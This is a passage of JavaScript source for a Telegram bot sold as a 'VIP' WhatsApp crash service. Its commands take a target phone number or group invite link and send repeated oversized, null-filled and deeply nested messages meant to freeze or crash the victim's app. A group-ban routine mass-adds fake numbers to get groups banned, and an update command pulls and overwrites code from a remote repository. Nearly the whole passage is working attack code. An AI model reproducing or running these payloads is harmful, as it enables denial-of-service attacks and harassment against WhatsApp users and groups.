      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug Ui ${i + 1}/50 To ${q}`));
      await DelayHardXc(sock, target);
      await delayhwh(sock, target);
   await FreezerXdelay(sock, target);
      await sleep(500);
    }
});

//blank
bot.command("blank", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /blank 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/e00cir.jpg", {
    caption: `
<blockquote>交 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ᝄ</blockquote>  
─ WhatsAppにバグを送信するためのTelegramボット。注意と責任を持ってご利用ください.

" バグ情報
☇ Target: ${q}
☇ Status: Succes
☇ Type: /blank
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "𝗖𝗵𝗲𝗰𝗸 ☇ 𝗧𝗮𝗿𝗴𝗲𝘁", url: `https://wa.me/${q}` }]],
    },
  });

     for (let i = 0; i < 50; i++) {
      console.log(chalk.red(`Send Bug Ui ${i + 1}/50 To ${q}`));
      await crashXv(sock, target);
      await Xpwnzzz(sock, target);
      await sleep(500);
    }
});

//bangb
bot.command("bandgb", checkPremiumOrGroupPremium, checkWhatsAppConnection, async (ctx) => {
    const link = ctx.message.text.split(" ")[1];

    if (!link) {
        return ctx.reply(
            `🪧 *Format:* /bandgb https://chat.whatsapp.com/xxxxxx`,
            { parse_mode: "Markdown" }
        );
    }

    const inviteCode = extractInviteCode(link);

    if (!inviteCode) {
        return ctx.reply(
            `❌ *Link tidak valid!* Pastikan link undangan grup WhatsApp.`,
            { parse_mode: "Markdown" }
        );
    }

    const thumbnailURL = "https://files.catbox.moe/s7amsc.jpg";

    const processMessage = await ctx.telegram.sendVideo(
        ctx.chat.id,
        thumbnailURL,
        {
            caption: `
<blockquote><pre>𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>🔄 Processing... (Join Grup)</b>
`,
            parse_mode: "HTML"
        }
    );

    const processMsgId = processMessage.message_id;

    try {

        const target = await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            throw new Error("Gagal join: groupJid kosong. Cek link atau bot sudah join sebelumnya.");
        }

        console.log(chalk.green(`✅ Berhasil join grup: ${target}`));

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Join Berhasil! ID: ${target}</b>
`,
            { parse_mode: "HTML" }
        );


        await BanGbNew(sock, target);


        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>✅ Success! Function executed</b>
`,
            { parse_mode: "HTML" }
        );


    } catch (err) {

        console.error(chalk.red(`❌ Gagal: ${err.message}`));

        let errorMsg = err.message;

        if (errorMsg.includes("already") || errorMsg.includes("exist")) {
            errorMsg = "Bot sudah pernah bergabung ke grup ini sebelumnya.";
        } else if (errorMsg.includes("invalid") || errorMsg.includes("expired")) {
            errorMsg = "Link undangan tidak valid atau sudah kadaluarsa.";
        }

        await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMsgId,
            undefined,
            `
<blockquote><pre>𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃</pre></blockquote>
⌑ Target Grup: ${inviteCode}
⌑ Type: Auto Join + Group Ban
⌑ Status: <b>❌ Gagal: ${errorMsg}</b>
`,
            { parse_mode: "HTML" }
        );
    }
});



// ============================================================
//  PULL UPDATE
// ============================================================
const UPDATE_URL = "https://raw.githubusercontent.com/Unbandfoul/scary_autoupdate/refs/heads/main/scary.js";
const UPDATE_FILE_PATH = "./aurelvip.js";

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https.get(url, (res) => {
      if (res.statusCode !== 200) {
        file.close(() => fs.unlink(filePath, () => {}));
        return reject(new Error(`HTTP_${res.statusCode}`));
      }

      res.pipe(file);

      file.on("finish", () => file.close(resolve));
    }).on("error", (err) => {
      file.close(() => fs.unlink(filePath, () => {}));
      reject(err);
    });
  });
}

bot.command("pullupdate", async (ctx) => {
  if (!OWNER_IDS.includes(ctx.from.id.toString())) {
    return ctx.reply("❌ Akses hanya untuk owner!");
  }

  const prosesMsg = new HTML()
    .heading(2, "✨ AUTO UPDATE")
    .divider()
    .table(
      [
        ["Status", "🔎 Installing File..."],
        ["Source", "GitHub Repository"],
        ["Process", "Downloading File"]
      ],
      { bordered: true, striped: true, hasHeader: false }
    )
    .divider()
    .paragraph(
      HTML.bold("⏳ Sedang melakukan sinkronisasi script...") +
      "\n" + HTML.italic("Mohon tunggu beberapa saat.")
    )
    .build();

  await ctx.sendRichMessage(prosesMsg);

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    const successMsg = new HTML()
      .heading(2, "✅ UPDATE SUCCESS")
      .divider()
      .table(
        [
          ["Status", "✅ Completed Download"],
          ["File", "scary.js"],
          ["Source", "GitHub Repository"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("⏳ Script berhasil mendownload file scary.js.") +
        "\n" + HTML.italic("♻️ Automatic Restarting bot...")
      )
      .divider()
      .footer(HTML.italic("𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 © 2026"))
      .build();

    await ctx.sendRichMessage(successMsg);

    setTimeout(() => process.exit(0), 1500);

  } catch (e) {
    const errorMsg = new HTML()
      .heading(2, "❌ UPDATE FAILED")
      .divider()
      .table(
        [
          ["Status", "❌ Error"],
          ["Action", "Cancelled"]
        ],
        { bordered: true, striped: true, hasHeader: false }
      )
      .divider()
      .paragraph(
        HTML.bold("Sinkronisasi script gagal dilakukan.")
      )
      .pre(String(e.message || e), 'text')
      .build();

    await ctx.sendRichMessage(errorMsg);
  }
});

// ============================================================
//  FUNCTION BUG
// ============================================================
async function delayhard(sock, target) {
  for (let p = 0; p < 50; p++) {
    const pm = {
      lottieStickerMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0&mms3=true",
            fileSha256: "dlob6oYb5Tr671y0M+se6D7DUwViTijFhYc1luOGbTA=",
            mediaKey: "v79wuS5Lfl653TKue0ZwUyHqfYWnUPjFndomy0qTZjM=",
            mimetype: "application/was",
            height: 1280,
            width: 909,
            directPath: "/v/t62.7118-24/612482636_821750694302087_4779711558667252836_n.enc?ccb=11-4&oh=01_Q5Aa4AHVZ2xLlZMDEVgIxo30GOGkFUnQDBShF6eBPA_n--PjRg&oe=69F0CF65&_nc_sid=5e03e0",
            fileLength: "134544",
            mediaKeyTimestamp: "1774806705",
            isAnimated: true,
            stickerSentTs: "1774806705729",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            contextInfo: {
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              urlTrackingMap: {
                urlTrackingMapElements: Array.from(
                  { length: 500000 },
                  () => ({ "\0": "\0" })
                )
              }
            }
          }
        }
      }
    };
    await sock.relayMessage("status@broadcast", pm, {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "contacts" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    });
    await sleep(3000);
  }
}

async function elyndelayin(sock, target) {
  try {
    await Promise.allSettled(
      Array(100).fill(null).map(() =>
        sock.relayMessage("status@broadcast", {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/elynn_delaymekk_" + Date.now(),
            mimetype: "image/jpeg",
            caption: "\u202E\u202D\u200F\u200E\u202A\u202B\u202C" + "Ҧ".repeat(100000),
            jpegThumbnail: Buffer.alloc(1024).fill(0xFF),
            fileLength: 999999999,
            height: 9999,
            width: 9999,
            mediaKey: Buffer.alloc(32).fill(0xFF),
            fileEncSha256: Buffer.alloc(32).fill(0xFF),
            fileSha256: Buffer.alloc(32).fill(0xFF),
            directPath: "/v/t62.7118-24/elynn" + "Ҧ".repeat(50000)
          }
        }, {
          statusJidList: [target],
          messageId: "ELYNN-" + Date.now() + "-" + Math.random().toString(36).substr(2, 9)
        })
      )
    );

    return { success: true };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

async function sendText2(sock, target) {
  const textMsg = {
    extendedTextMessage: {
      text: "xӘҴҮКҖΠΟω αС” γΟω?" + "Ҧ".repeat(50100) + "\n\nJust INCEPTION" + "\0".repeat(100),
      matchedText: "https://t.me/ziperr2",
      description: "xӘҴҮКҖ ΠΟω αС” γΟω?",
      title: "Ҫ".repeat(20000),
      previewType: 6,
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
      paymentLinkMetadata: {
        button: { displayText: "Love U My Ayun" },
        header: { headerType: 1 },
        provider: { paramsJson: "{".repeat(10000) }
      },
      contextInfo: {
        isForwarded: true,
        forwardingScore: 9999,
        participant: target,
        remoteJid: "status@broadcast",
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
        ],
        quotedMessage: {
          newsletterAdminInviteMessage: {
            newsletterJid: "otax@newsletter",
            newsletterName: "xӘҴҮКҖ ΠΟω αС” γΟω?" + "Ҧ".repeat(10000),
            caption: "xӘҴҮКҖ ΠΟω αС” γΟω?" + "Ҧ".repeat(60000) + "ោ៝".repeat(60000),
            inviteExpiration: "999999999"
          }
        },
        forwardedNewsletterMessageInfo: {
          newsletterName: "xӘҴҮКҖ ΠΟω αС” γΟω?" + "қҷ°ҷ°ҷ°".repeat(10000),
          newsletterJid: "13135550002@newsletter",
          serverId: 1
        }
      }
    }
  };

  const msg = await generateWAMessageFromContent(target, textMsg, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
          },
        ],
      },
    ],
  });
}

async function scaryy(sock, target) {
  const msg = {
    interactiveMessage: {
      body: {
        text: "🆂🅲🅰🆁🆈*"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50000 }, () => ({}))
      }
    }
  };

  await sock.sendMessage(target, { text: "BY @%ziper" + "ᏸ}".repeat(1000) });
  await new Promise(r => setTimeout(r, 500));
  await sock.relayMessage(target, msg, { noSelfSync: true });
}


async function BanGbNew(sock, target) {
    if (!target.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}

        try {
            await sock.sendPresenceUpdate('composing', group);
        } catch (_) {}

        try {
            const fakeNumbers = Array.from({ length: 100 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 30));
            }
            await sock.sendMessage(group, { text: `tw ke band` }).catch(() => {});
        } catch (_) {}
    }
}

async function ForceNew(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: target tidak valid');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: gagal');
}


async function ComboX(sock, target) {
const msg1 = {
viewOnceMessageV2: {
message: {
nteractiveResponseMessage: {
body: {
text: " 🩸⃟༑⌁⃰MakMooཀ‌‌🦠 ",
title: "\u0000".repeat(200000),
format: "DEFAULT",
},
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(1000000),
version: 3,
},
},
},
},
};

const msg2 = {
groupStatusMessageV2: {
message: {
nteractiveResponseMessage: {
body: {
text: " 🩸⃟༑⌁⃰MakMooཀ‌‌🦠 ",
title: "\u0000".repeat(200000),
format: "DEFAULT",
},
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(1000000),
version: 3,
},
},
},
},
};
await sock.relayMessage(target, msg1, {}); 
await sock.relayMessage(target, msg2, {});
}

async function Xpwnzzz(sock, target) {
const msg = {
      messageType: 3,
      mediaMetadata: {},
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: " capek anj "
            },
            nativeFlowMessage: {
              extra: "\u31040",
              buttons: "A".repeat(20000)
            }
          }
        }
      }
    };
await sock.relayMessage(target, msg, {});
  noSelfSync; true
};

async function crashXv(sock, target) {
const msg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: " : ?⃟꙰ C Ϟ à! ✶⤻꙳‌‌༑ᐧ‌⌁⃰",
              extra: "\u31040"
            },
            nativeFlowMessage: {
              extra: "\u31040",
              buttons: "A".repeat(20000),
              buttons: Array.from({ length: 80000 }, () => ({})),
              extra1: "\u0000".repeat(80000),
              extra2: "\u0000".repeat(50000)
            }
          }
        }
      }
    };
await sock.relayMessage(target, msg, {});
  noSelfSync; true
}

async function forcloseinfinity(sock, target) {
  const IMG = {
    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
    directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
    mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
    fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
    fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
    fileLength: 999999999,
    mediaKeyTimestamp: "1785637793",
    mimetype: "image/jpeg",
    height: 9999,
    width: 9999,
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgUVJT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6aZz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABEQACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z"
  };

  const msg = {
    interactiveMessage: {
      header: {
        imageMessage: IMG,
        hasMediaAttachment: true
      },
      body: {
        text: " sikkt ¡!",
        format: "DEFAULT"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 999999 }, () => ({})),
        messageParamsJson: "{".repeat(15000),
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"HEKSEN" + "ြ".repeat(45000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"maklo?" + "ြ".repeat(45000)}\",
        \"quantity\":-999,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
          }
        ]
      },
      contextInfo: { //billy
        quotedMessage: {
          interactiveMessage: {
            body: {
              text: "\u0000".repeat(50000),
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    }
  };
  await sock.relayMessage(target, msg, {});
}
async function FreezerXdelay(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "kontol lu"
                    },
                    nativeFlowMessage: {
                        buttons: "\u200B" + "\n".repeat(25000)
                    }
                }
            }
        }
    };

    const msg2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " apk bak wangcap "
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };
        await sock.relayMessage(target, msg1, { noSelfSync: true });
        await sock.relayMessage(target, msg2, { noSelfSync: true });
    }

async function delayhwh(sock, target) {
  const msg = {
    groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "\u0000".repeat(500000)
                        }
                    }
                }
            }
        };
await sock.relayMessage(target, msg, {});

  console.log("succes send to target");
}

async function DelayHardXc(sock, target) {
const msg = {
groupStatusMessageV2: {
message: {
interactiveMessage: {
body: { text: "MakloFreeze" },
nativeFlowMessage: {
buttons: "\u0000" + "\u3164".repeat(500000),
nativeFlowResponseMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
}
};
await sock.relayMessage(target, msg, {});
}


async function DelayNew(sock, target) {
    const msg = {
        templateMessage: {
            hydratedTemplate: {
                hydratedTitleText: "°¿monyet🎩°",
                hydratedContentText: "°¿°",
                hydratedFooterText: "maklo¿©°",
                hydratedButtons: [
                    {
                        quickReplyButton: {
                            displayText: "\u0000",
                            id: "ok_btn"
                        }
                    },
                    {
                        urlButton: {
                            displayText: "\u200D" + "\u200B".repeat(500000),
                            url: "https://t.me//"
                        }
                    },
                    {
                        callButton: {
                            displayText: "\u200C",
                            phoneNumber: "62××××××"
                        }
                    }
                ],
                templateId: "template_" + Date.now(),
                maskLinkedDevices: false
            },
            contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999
            }
        }
    };

    await sock.relayMessage(target, msg, {});
}

async function delayForSpam(sock, target) {
    await sock.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\x10"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        },
        {}
    );
}
// ============================================================
//  LAUNCH
// ============================================================
(async () => {
  console.log(chalk.cyanBright.bold(`
╭──────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp..')}
╰──────────────────────────╯
  `));

  console.log(chalk.green('✅ Database JSON Ready (No MongoDB)'));
  console.log(chalk.cyan('🚀 𝐀𝐱𝐊 𝐂𝐫𝐚𝐬𝐡𝐱𝐅𝐨𝐫𝐞𝐯𝐞𝐫 𝑉𝐼𝑃 ACTIVATED'));

  startSesi();
  bot.launch();
})();